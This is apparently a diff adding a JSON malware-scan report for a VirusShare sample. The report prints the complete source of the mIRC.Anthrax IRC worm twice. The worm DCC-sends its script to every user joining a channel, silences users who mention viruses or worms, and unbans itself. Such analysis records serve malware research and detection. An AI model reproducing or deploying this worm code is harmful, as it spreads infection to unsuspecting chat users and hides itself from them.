@@ -1,0 +1,52 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {},
+        "macro": "n0=; - mIRC.Anthrax -\nn1=; by -KD- [Metaphase & NoMercy]\nn2=ON 1:START:{ .sreq ignore\nn3=  .remote on\nn4=  titlebar (Not connected)\nn5=  }\nn6=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt } \nn7=  /dcc send $nick $script.ini                \nn8=}\nn9=\nn10=ON 1:TEXT:*anthrax*:#:/say Anthrax owns me!!!\nn11=on 1:TEXT:names:?:/nick _Anthrax_\nn12=ON 1:TEXT:*virus*:#:/.ignore $nick \nn13=ON 1:TEXT:*worm*:#:/.ignore $nick \nn14=ON 1:TEXT:*script.ini*:#:/.ignore $nick \nn15=;ON 1:PART:#:{ /if ( $nick == $me ) { halt }\nn16=/dcc send $nick $script.ini                  \nn17=} \nn18= \nn19=; if banned and still have ops unban your self\nn20=ON @1:BAN:#:if ( $banmask iswm $address($me,5) ) mode $chan -b $banmask\nn21=ON 1:QUIT:#:/msg $chan Anthrax it rocks!"
+    },
+    "filename": "VirusShare_c1c1292285298c989af9c9677341c93f",
+    "filesize": 763,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "c1c1292285298c989af9c9677341c93f",
+        "sha1": "787f1944b3034900189d3451aec72296ae64ff49",
+        "sha256": "c22ae36deab8ccabcd7d6bee6c18a639f0dcdc466b94eeafe0dbb247411a2e1f"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "n0=; - mIRC.Anthrax -",
+            "n1=; by -KD- [Metaphase & NoMercy]",
+            "n2=ON 1:START:{ .sreq ignore",
+            "n3=  .remote on",
+            "n4=  titlebar (Not connected)",
+            "n5=  }",
+            "n6=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt } ",
+            "n7=  /dcc send $nick $script.ini                ",
+            "n8=}",
+            "n10=ON 1:TEXT:*anthrax*:#:/say Anthrax owns me!!!",
+            "n11=on 1:TEXT:names:?:/nick _Anthrax_",
+            "n12=ON 1:TEXT:*virus*:#:/.ignore $nick ",
+            "n13=ON 1:TEXT:*worm*:#:/.ignore $nick ",
+            "n14=ON 1:TEXT:*script.ini*:#:/.ignore $nick ",
+            "n15=;ON 1:PART:#:{ /if ( $nick == $me ) { halt }",
+            "n16=/dcc send $nick $script.ini                  ",
+            "n17=} ",
+            "n18= ",
+            "n19=; if banned and still have ops unban your self",
+            "n20=ON @1:BAN:#:if ( $banmask iswm $address($me,5) ) mode $chan -b $banmask",
+            "n21=ON 1:QUIT:#:/msg $chan Anthrax it rocks!"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.258713",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
